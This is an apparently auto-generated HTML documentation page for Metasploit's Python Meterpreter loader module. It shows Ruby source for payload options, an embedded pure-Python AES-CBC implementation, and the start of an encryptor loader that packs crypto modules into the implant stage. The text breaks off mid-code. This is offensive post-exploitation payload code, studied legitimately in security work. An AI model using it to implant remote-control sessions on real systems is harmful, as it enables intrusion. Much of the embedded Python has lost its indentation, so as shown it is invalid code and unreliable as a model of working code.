<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
  Module: Msf::Payload::Python::MeterpreterLoader
  
    &mdash; Documentation by YARD 0.9.28
  
</title>

  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />

  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />

<script type="text/javascript">
  pathId = "Msf::Payload::Python::MeterpreterLoader";
  relpath = '../../../';
</script>


  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>

  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>


  </head>
  <body>
    <div class="nav_wrap">
      <iframe id="nav" src="../../../class_list.html?1"></iframe>
      <div id="resizer"></div>
    </div>

    <div id="main" tabindex="-1">
      <div id="header">
        <div id="menu">
  
    <a href="../../../_index.html">Index (M)</a> &raquo;
    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Python.html" title="Msf::Payload::Python (module)">Python</a></span></span>
     &raquo; 
    <span class="title">MeterpreterLoader</span>
  
</div>

        <div id="search">
  
    <a class="full_list_link" id="class_list_link"
        href="../../../class_list.html">

        <svg width="24" height="24">
          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
        </svg>
    </a>
  
</div>
        <div class="clear"></div>
      </div>

      <div id="content"><h1>Module: Msf::Payload::Python::MeterpreterLoader
  
  
  
</h1>
<div class="box_info">
  

  
  
  
  
  <dl>
      <dt>Includes:</dt>
      <dd><span class='object_link'><a href="../Python.html" title="Msf::Payload::Python (module)">Msf::Payload::Python</a></span>, <span class='object_link'><a href="../TransportConfig.html" title="Msf::Payload::TransportConfig (module)">TransportConfig</a></span>, <span class='object_link'><a href="../UUID/Options.html" title="Msf::Payload::UUID::Options (module)">UUID::Options</a></span>, <span class='object_link'><a href="../../Sessions/MeterpreterOptions.html" title="Msf::Sessions::MeterpreterOptions (module)">Sessions::MeterpreterOptions</a></span></dd>
  </dl>
  
  

  

  
  <dl>
    <dt>Defined in:</dt>
    <dd>lib/msf/core/payload/python/meterpreter_loader.rb</dd>
  </dl>
  
</div>

<h2>Overview</h2><div class="docstring">
  <div class="discussion">
    
<p>Common module stub for ARCH_PYTHON payloads that make use of Meterpreter.</p>


  </div>
</div>
<div class="tags">
  

</div>


  <h2>Constant Summary</h2>
  
  <h3 class="inherited">Constants included
     from <span class='object_link'><a href="../../Sessions/MeterpreterOptions.html" title="Msf::Sessions::MeterpreterOptions (module)">Sessions::MeterpreterOptions</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../../Sessions/MeterpreterOptions.html#TIMEOUT_COMMS-constant" title="Msf::Sessions::MeterpreterOptions::TIMEOUT_COMMS (constant)">Sessions::MeterpreterOptions::TIMEOUT_COMMS</a></span>, <span class='object_link'><a href="../../Sessions/MeterpreterOptions.html#TIMEOUT_RETRY_TOTAL-constant" title="Msf::Sessions::MeterpreterOptions::TIMEOUT_RETRY_TOTAL (constant)">Sessions::MeterpreterOptions::TIMEOUT_RETRY_TOTAL</a></span>, <span class='object_link'><a href="../../Sessions/MeterpreterOptions.html#TIMEOUT_RETRY_WAIT-constant" title="Msf::Sessions::MeterpreterOptions::TIMEOUT_RETRY_WAIT (constant)">Sessions::MeterpreterOptions::TIMEOUT_RETRY_WAIT</a></span>, <span class='object_link'><a href="../../Sessions/MeterpreterOptions.html#TIMEOUT_SESSION-constant" title="Msf::Sessions::MeterpreterOptions::TIMEOUT_SESSION (constant)">Sessions::MeterpreterOptions::TIMEOUT_SESSION</a></span></p>

  
  
  <h3 class="inherited">Constants included
     from <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN_MAX_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITJ-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITP-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITW-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INIT_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MODES-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_UUID_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN</a></span></p>





  
    <h2>
      Instance Method Summary
      <small><a href="#" class="summary_toggle">collapse</a></small>
    </h2>

    <ul class="summary">
      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(info = {})  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'></div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#python_aes_source-instance_method" title="#python_aes_source (instance method)">#<strong>python_aes_source</strong>  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'></div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#python_encryptor_loader-instance_method" title="#python_encryptor_loader (instance method)">#<strong>python_encryptor_loader</strong>  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'></div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#python_rsa_source-instance_method" title="#python_rsa_source (instance method)">#<strong>python_rsa_source</strong>  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'></div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#stage_meterpreter-instance_method" title="#stage_meterpreter (instance method)">#<strong>stage_meterpreter</strong>(opts = {})  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Get the raw Python Meterpreter stage and patch in values based on the configuration.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#stage_payload-instance_method" title="#stage_payload (instance method)">#<strong>stage_payload</strong>(opts = {})  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'></div></span>
  
</li>

      
    </ul>
  


  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../Sessions/MeterpreterOptions.html" title="Msf::Sessions::MeterpreterOptions (module)">Sessions::MeterpreterOptions</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../../Sessions/MeterpreterOptions.html#meterpreter_logging_config-instance_method" title="Msf::Sessions::MeterpreterOptions#meterpreter_logging_config (method)">#meterpreter_logging_config</a></span>, <span class='object_link'><a href="../../Sessions/MeterpreterOptions.html#mettle_logging_config-instance_method" title="Msf::Sessions::MeterpreterOptions#mettle_logging_config (method)">#mettle_logging_config</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../TransportConfig.html" title="Msf::Payload::TransportConfig (module)">TransportConfig</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../TransportConfig.html#transport_config_bind_named_pipe-instance_method" title="Msf::Payload::TransportConfig#transport_config_bind_named_pipe (method)">#transport_config_bind_named_pipe</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_bind_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_bind_tcp (method)">#transport_config_bind_tcp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_http-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_http (method)">#transport_config_reverse_http</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_https-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_https (method)">#transport_config_reverse_https</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_ipv6_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_ipv6_tcp (method)">#transport_config_reverse_ipv6_tcp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_named_pipe-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_named_pipe (method)">#transport_config_reverse_named_pipe</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_tcp (method)">#transport_config_reverse_tcp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_udp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_udp (method)">#transport_config_reverse_udp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_uri_components-instance_method" title="Msf::Payload::TransportConfig#transport_uri_components (method)">#transport_uri_components</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../UUID/Options.html" title="Msf::Payload::UUID::Options (module)">UUID::Options</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../UUID/Options.html#generate_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#generate_payload_uuid (method)">#generate_payload_uuid</a></span>, <span class='object_link'><a href="../UUID/Options.html#generate_uri_uuid_mode-instance_method" title="Msf::Payload::UUID::Options#generate_uri_uuid_mode (method)">#generate_uri_uuid_mode</a></span>, <span class='object_link'><a href="../UUID/Options.html#record_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid (method)">#record_payload_uuid</a></span>, <span class='object_link'><a href="../UUID/Options.html#record_payload_uuid_url-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid_url (method)">#record_payload_uuid_url</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_checksum-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_checksum (method)">#generate_uri_checksum</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_uuid-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_uuid (method)">#generate_uri_uuid</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#process_uri_resource-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#process_uri_resource (method)">#process_uri_resource</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#uri_checksum_lookup-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#uri_checksum_lookup (method)">#uri_checksum_lookup</a></span></p>

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Python.html" title="Msf::Payload::Python (module)">Msf::Payload::Python</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../Python.html#create_exec_stub-class_method" title="Msf::Payload::Python.create_exec_stub (method)">create_exec_stub</a></span>, <span class='object_link'><a href="../Python.html#py_create_exec_stub-instance_method" title="Msf::Payload::Python#py_create_exec_stub (method)">#py_create_exec_stub</a></span></p>


  <div id="instance_method_details" class="method_details_list">
    <h2>Instance Method Details</h2>

    
      <div class="method_details first">
  <h3 class="signature first" id="initialize-instance_method">
  
    #<strong>initialize</strong>(info = {})  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/meterpreter_loader.rb', line 19</span>

<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='kw'>super</span><span class='lparen'>(</span><span class='id identifier rubyid_update_info'>update_info</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span><span class='comma'>,</span>
    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Name</span><span class='tstring_end'>&#39;</span></span>          <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Meterpreter &amp; Configuration</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Description</span><span class='tstring_end'>&#39;</span></span>   <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Run Meterpreter &amp; the configuration stub</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Author</span><span class='tstring_end'>&#39;</span></span>        <span class='op'>=&gt;</span> <span class='lbracket'>[</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Spencer McIntyre</span><span class='tstring_end'>&#39;</span></span> <span class='rbracket'>]</span><span class='comma'>,</span>
    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Platform</span><span class='tstring_end'>&#39;</span></span>      <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>python</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Arch</span><span class='tstring_end'>&#39;</span></span>          <span class='op'>=&gt;</span> <span class='const'>ARCH_PYTHON</span><span class='comma'>,</span>
    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Stager</span><span class='tstring_end'>&#39;</span></span>        <span class='op'>=&gt;</span> <span class='lbrace'>{</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span><span class='rbrace'>}</span>
  <span class='rparen'>)</span><span class='rparen'>)</span>

  <span class='id identifier rubyid_register_advanced_options'>register_advanced_options</span><span class='lparen'>(</span>
    <span class='lbracket'>[</span>
      <span class='const'><span class='object_link'><a href="../../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MeterpreterTryToFork</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Fork a new process if the functionality is available</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
        <span class='label'>default:</span> <span class='kw'>true</span>
      <span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'><span class='object_link'><a href="../../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MeterpreterDebugBuild</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Enable debugging for the Python meterpreter</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
        <span class='label'>aliases:</span> <span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PythonMeterpreterDebug</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
      <span class='rparen'>)</span>
    <span class='rbracket'>]</span> <span class='op'>+</span>
    <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Opt.html" title="Msf::Opt (module)">Opt</a></span></span><span class='op'>::</span><span class='id identifier rubyid_http_header_options'><span class='object_link'><a href="../../Opt.html#http_header_options-class_method" title="Msf::Opt.http_header_options (method)">http_header_options</a></span></span>
  <span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="python_aes_source-instance_method">
  
    #<strong>python_aes_source</strong>  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/meterpreter_loader.rb', line 245</span>

<span class='kw'>def</span> <span class='id identifier rubyid_python_aes_source'>python_aes_source</span>
  <span class='tstring'><span class='tstring_beg'>%Q?</span><span class='tstring_content'>
import copy,struct,sys
def chunks(lst, n):
	for i in range(0,len(lst),n):
yield lst[i:i+n]
def _cw(word):
	return(word[0]&lt;&lt;24)|(word[1]&lt;&lt;16)|(word[2]&lt;&lt;8)|word[3]
def _s2b(text):
	return list(ord(c)for c in text)
def _b2s(binary):
	return &quot;&quot;.join(chr(b)for b in binary)
if sys.version_info[0]&gt;=3:
	xrange=range
	def _s2b(text):
if isinstance(text,bytes):
	return text
return[ord(c)for c in text]
	def _b2s(binary):
return bytes(binary)
else:
	bytes=lambda s,e:s
def _gmul(a, b):
	r=0
	while b:
if b&amp;1: r^=a
a&lt;&lt;=1
if a&gt;255: a^=0x11B
b&gt;&gt;=1
	return r
def _mix(n, vec):
	return sum(_gmul(n,v)&lt;&lt;(24-8*shift) for shift,v in enumerate(vec))
def _ror32(n):
	return (n&amp;255)&lt;&lt;24|n&gt;&gt;8
def _rcon():
	return [_gmul(1, 1&lt;&lt;n) for n in range(30)]
def _Si(S):
	return [S.index(n) for n in range(len(S))]
def _mixl(S, vec):
	return [_mix(s, vec) for s in S]
def _rorl(T):
	return [_ror32(t) for t in T]
empty=struct.pack(&#39;&#39;)
class AESCBC(object):
	nrs={16:10,24:12,32:14}
	rcon=_rcon()
	S=[99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22]
	Si=_Si(S)
	T1=_mixl(S, (2,1,1,3))
	T2=_rorl(T1)
	T3=_rorl(T2)
	T4=_rorl(T3)
	T5=_mixl(Si, (14,9,13,11))
	T6=_rorl(T5)
	T7=_rorl(T6)
	T8=_rorl(T7)
	U1=_mixl(range(256), (14,9,13,11))
	U2=_rorl(U1)
	U3=_rorl(U2)
	U4=_rorl(U3)
	def __init__(self,key):
if len(key)not in(16,24,32):
	raise ValueError(&#39;Invalid key size&#39;)
rds=self.nrs[len(key)];self._Ke=[[0]*4 for i in xrange(rds+1)];self._Kd=[[0]*4 for i in xrange(rds+1)];rnd_kc=(rds+1)*4;KC=len(key)//4;tk=[struct.unpack(&#39;&gt;i&#39;,key[i:i+4])[0]for i in xrange(0,len(key),4)];rconpointer=0;t=KC
for i in xrange(0,KC):
	self._Ke[i//4][i%4]=tk[i];self._Kd[rds-(i//4)][i%4]=tk[i]
while t &lt; rnd_kc:
	tt=tk[KC-1];tk[0]^=((self.S[(tt&gt;&gt;16)&amp;255]&lt;&lt;24)^(self.S[(tt&gt;&gt;8)&amp;255]&lt;&lt;16)^(self.S[tt&amp;255]&lt;&lt;8)^self.S[(tt&gt;&gt;24)&amp;255]^(self.rcon[rconpointer]&lt;&lt;24));rconpointer+=1
	if KC!=8:
		for i in xrange(1,KC):
			tk[i]^=tk[i-1]
	else:
		for i in xrange(1,KC//2):
			tk[i]^=tk[i-1]
		tt=tk[KC//2-1];tk[KC//2]^=(self.S[tt&amp;255]^(self.S[(tt&gt;&gt;8)&amp;255]&lt;&lt;8)^(self.S[(tt&gt;&gt;16)&amp;255]&lt;&lt;16)^(self.S[(tt&gt;&gt;24)&amp;255]&lt;&lt;24))
		for i in xrange(KC//2+1,KC):
			tk[i]^=tk[i-1]
	j=0
	while j&lt;KC and t&lt;rnd_kc:
		self._Ke[t//4][t%4]=tk[j];self._Kd[rds-(t//4)][t%4]=tk[j];j+=1;t+=1
for r in xrange(1,rds):
	for j in xrange(0,4):
		tt=self._Kd[r][j];self._Kd[r][j]=(self.U1[(tt&gt;&gt;24)&amp;255]^self.U2[(tt&gt;&gt;16)&amp;255]^self.U3[(tt&gt;&gt;8)&amp;255]^self.U4[tt&amp;255])
	def _encdec(self,data,K,s,S,L1,L2,L3,L4):
if len(data)!=16:
	raise ValueError(&#39;wrong block length&#39;)
rds=len(K)-1;(s1,s2,s3)=s;a=[0,0,0,0];t=[(_cw(data[4*i:4*i+4])^K[0][i])for i in xrange(0,4)]
for r in xrange(1,rds):
	for i in xrange(0,4):
		a[i]=(L1[(t[i]&gt;&gt;24)&amp;255]^L2[(t[(i+s1)%4]&gt;&gt;16)&amp;255]^L3[(t[(i+s2)%4]&gt;&gt;8)&amp;255]^L4[t[(i+s3)%4]&amp;255]^K[r][i])
	t=copy.copy(a)
rst=[]
for i in xrange(0,4):
	tt=K[rds][i];rst.append((S[(t[i]&gt;&gt;24)&amp;255]^(tt&gt;&gt;24))&amp;255);rst.append((S[(t[(i+s1)%4]&gt;&gt;16)&amp;255]^(tt&gt;&gt;16))&amp;255);rst.append((S[(t[(i+s2)%4]&gt;&gt;8)&amp;255]^(tt&gt;&gt;8))&amp;255);rst.append((S[t[(i+s3)%4]&amp;255]^tt)&amp;255)
return rst
	def enc_in(self,pt):
return self._encdec(pt,self._Ke,[1,2,3],self.S,self.T1,self.T2,self.T3,self.T4)
	def dec_in(self,ct):
return self._encdec(ct,self._Kd,[3,2,1],self.Si,self.T5,self.T6,self.T7,self.T8)
	def pad(self,pt):
c=16-(len(pt)%16)
return pt+bytes(chr(c)*c,&#39;utf-8&#39;)
	def unpad(self,pt):
c=pt[-1]
if type(c)!=int:
	c=ord(c)
return pt[:-c]
	def encrypt(self,iv,pt):
if len(iv)!=16:
	raise ValueError(&#39;initialization vector must be 16 bytes&#39;)
else:
	self._lcb=_s2b(iv)
pt=self.pad(pt)
return empty.join([self.enc_b(b)for b in chunks(pt,16)])
	def enc_b(self,pt):
if len(pt)!=16:
	raise ValueError(&#39;plaintext block must be 16 bytes&#39;)
pt=_s2b(pt);pcb=[(p^l)for(p,l)in zip(pt,self._lcb)];self._lcb=self.enc_in(pcb)
return _b2s(self._lcb)
	def decrypt(self,iv,ct):
if len(iv)!=16:
	raise ValueError(&#39;initialization vector must be 16 bytes&#39;)
else:
	self._lcb=_s2b(iv)
if len(ct)%16!=0:
	raise ValueError(&#39;ciphertext must be a multiple of 16&#39;)
return self.unpad(empty.join([self.dec_b(b)for b in chunks(ct,16)]))
	def dec_b(self,ct):
if len(ct)!=16:
	raise ValueError(&#39;ciphertext block must be 16 bytes&#39;)
cb=_s2b(ct);pt=[(p^l)for(p,l)in zip(self.dec_in(cb),self._lcb)];self._lcb=cb
return _b2s(pt)
</span><span class='tstring_end'>?</span></span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="python_encryptor_loader-instance_method">
  
    #<strong>python_encryptor_loader</strong>  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/meterpreter_loader.rb', line 156</span>

<span class='kw'>def</span> <span class='id identifier rubyid_python_encryptor_loader'>python_encryptor_loader</span>
  <span class='id identifier rubyid_aes_encryptor'>aes_encryptor</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_encode_base64'>encode_base64</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_zlib_deflate'>zlib_deflate</span><span class='lparen'>(</span><span class='id identifier rubyid_python_aes_source'>python_aes_source</span><span class='rparen'>)</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_rsa_encryptor'>rsa_encryptor</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_encode_base64'>encode_base64</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_zlib_deflate'>zlib_deflate</span><span class='lparen'>(</span><span class='id identifier rubyid_python_rsa_source'>python_rsa_source</span><span class='rparen'>)</span><span class='rparen'>)</span>
  <span class='tstring'><span class='tstring_beg'>%Q?</span><span class='tstring_content'>
import codecs,base64,zlib
try:
import importlib.util
new_module = lambda x: importlib.util.spec_from_loader(x, loader=None)
except ImportError:
import imp
new_module = imp.new_module
met_aes = new_module(&#39;met_aes&#39;)
met_rsa = new_module(&#39;met_rsa&#39;)
